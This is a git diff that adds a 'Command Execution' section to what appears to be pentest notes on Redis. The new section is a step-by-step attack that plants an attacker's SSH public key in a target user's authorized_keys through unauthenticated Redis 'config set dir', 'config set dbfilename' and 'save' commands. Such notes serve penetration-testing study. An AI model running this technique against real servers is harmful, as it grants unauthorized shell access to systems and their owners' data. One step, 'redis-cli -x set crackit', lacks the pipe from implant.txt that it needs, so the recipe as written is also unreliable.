@@ -28,6 +28,25 @@ msf > use auxiliary/scanner/redis/redis_server
 msf auxiliary(scanner/redis/redis_server) > options
 ```
 
+## 02 - Command Execution
+
+TODO: Re-arrange it in initial foothold
+
+```
+$ ssh-keygen -qt rsa -b 4096 -f /tmp/id_rsa -C '' -N ''
+
+$ (echo -e "\n\n"; cat /tmp/id_rsa.pub; echo -e "\n\n") > implant.txt
+
+$ redis-cli -h <IP> -x set crackit
+
+<target_IP>:6379> config set dir /home/<username>/.ssh/
+OK
+<target_IP>:6379> config set dbfilename "authorized_keys"
+OK
+<target_IP>:6379> save
+OK
+```
+
 ---
 ## References
 
